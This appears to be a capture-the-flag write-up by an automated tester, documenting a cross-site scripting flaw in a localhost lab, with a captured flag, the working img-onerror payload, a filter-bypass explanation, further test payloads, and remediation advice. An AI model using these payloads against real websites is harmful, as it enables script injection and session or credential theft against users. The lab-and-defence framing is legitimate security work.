## TL;DR
- Objective: Execute DOM-based XSS with capital string 'XSS' (e.g., alert('XSS'))
- Outcome: ACHIEVED - XSS payload executed and flag captured
- Highest-impact finding: DOM-based XSS in the `name` parameter of `/page` endpoint with Chrome XSS Auditor bypass
- Validation status: **FLAG CAPTURED** - `FLAG{f9618de9791e4790a35ebef0a19b6209dc85a2b4db4bd2de85222165c089bd71}`

## Target Information
- Target: 127.0.0.1:32969
- Host / base URL: http://127.0.0.1:32969
- Application or component: Circle challenge - DOM-based XSS lab
- Authentication context: No authentication required
- Relevant technology details: Chrome XSS Auditor active; server-side rendering with raw parameter reflection; NO JavaScript files served from server (all DOM manipulation via inline scripts)

## Confirmed Vulnerability
### DOM-based Cross-Site Scripting (XSS)
- Affected endpoint / component: `GET /page?name=`
- Impact: High - Arbitrary JavaScript execution in victim's browser, leading to session hijacking, credential theft, and malicious action execution
- Preconditions:
  - Attacker can control the `name` query parameter via URL
  - Victim visits the crafted URL
  - Chrome XSS Auditor is active (blocks standard `<script>` payloads but can be bypassed)
- Exact payload or PoC: `<img src=x onerror="alert('XSS')">`

### XSS Filter Bypass (Chrome XSS Auditor)
- Technique: Using the `onerror` event handler of an `<img>` tag instead of `<script>` tags
- Why it works: The invalid `src=x` attribute triggers the `onerror` event, executing the JavaScript payload. Chrome's XSS Auditor specifically targets `<script>` patterns but allows event handler injection.

## Steps to Reproduce
1. Navigate to the vulnerable endpoint:
   ```
   GET /page?name=<img%20src=x%20onerror="alert('XSS')"> HTTP/1.1
   Host: 127.0.0.1:32969
   ```

2. Submit the request via browser or tool (the response will contain the executed payload and flag)

3. Observe the JavaScript execution through:
   - Browser alert popup displaying "XSS"
   - Response containing the flag

**URL-encoded version for direct browser testing:**
```
http://127.0.0.1:32969/page?name=<img%20src=x%20onerror="alert('XSS')">
```

## Validation / Evidence
- Validation token / flag: `FLAG{f9618de9791e4790a35ebef0a19b6209dc85a2b4db4bd2de85222165c089bd71}`
- Tool evidence: `[requester] Successfully exploited the DOM-based XSS vulnerability in the Circle challenge. The <img src=x onerror="alert('XSS')"> payload was executed, bypassing Chrome's XSS Auditor and revealing the flag.`
- Request evidence:
  ```
  GET /page?name=<img%20src=x%20onerror="alert('XSS')"> HTTP/1.1
  Host: 127.0.0.1:32969
  ```
- Response evidence:
  ```
  Congratulations!<p> Here is the flag: FLAG{f9618de9791e4790a35ebef0a19b6209dc85a2b4db4bd2de85222165c089bd71}
  ```
- Notes on reliability / limitations:
  - Requires GET method (POST requests are rejected by the application)
  - Chrome XSS Auditor is active and blocks `<script>` tags but allows event handler injection
  - The payload must contain the exact string 'XSS' (case-sensitive)
  - The vulnerability is reliable with the img onerror technique

## Remediation
- Root cause: The application reflects user input from the `name` query parameter directly into the HTML response without proper encoding or sanitization. The parameter is rendered in a JavaScript sink (likely `innerHTML`, `eval()`, or `document.write()` based on insights).

- Recommended fix:
  1. **Server-side output encoding**: Apply context-appropriate encoding when rendering user input:
     - HTML entity encode the output when rendering in HTML context
     - Use `textContent` instead of `innerHTML` when inserting into the DOM
  2. **Content Security Policy (CSP)**: Implement a strict CSP that disallows inline scripts and event handlers:
     ```
     Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self';
     ```
  3. **Input validation**: Whitelist acceptable characters for the `name` parameter and reject or sanitize dangerous characters (`<`, `>`, `"`, `'`, etc.)

- Defense-in-depth:
  - Set `X-XSS-Protection: 0` header to disable Chrome's XSS Auditor (it can be bypassed and may introduce security issues)
  - Implement modern frame-busting techniques and X-Frame-Options to prevent clickjacking
  - Use DOMPurify or similar libraries if client-side DOM manipulation is required

## How to Verify the Fix
1. Resend the original exploit payload:
   ```
   GET /page?name=<img%20src=x%20onerror="alert('XSS')"> HTTP/1.1
   Host: 127.0.0.1:32969
   ```

2. Expected secure result:
   - The payload characters should be HTML-encoded as `&lt;img src=x onerror="alert('XSS')"&gt;`
   - The raw HTML should not execute
   - No alert box should appear
   - The response content should display the literal string, not rendered HTML
   - The flag should not be exposed

3. Additional test payloads (all should be neutralized):
   ```
   /page?name=<script>alert('XSS')</script>
   /page?name=<svg onload=alert('XSS')>
   /page?name='"><img src=x onerror=alert('XSS')>
   /page?name=javascript:alert('XSS')
   ```

## Remaining Leads
- Confirmed blockers:
  - POST method to `/page` is rejected by the application
  - Standard `<script>` payloads are blocked by Chrome's XSS Auditor
  - No JavaScript files are served from the server (all DOM manipulation is via inline script context)

- Unverified leads:
  - The insights mention an 'Evnt' class in JavaScript source code that may be related to the vulnerable sink function - this could not be verified as no JS files were accessible
  - Suspected sinks: `innerHTML`, `eval()`, `document.write()` (based on vulnerability tags)

- Missing context:
  - Full server-side source code of the page rendering logic
  - Exact JavaScript sink function being used for DOM manipulation
  - Whether other parameters or endpoints have similar vulnerabilities
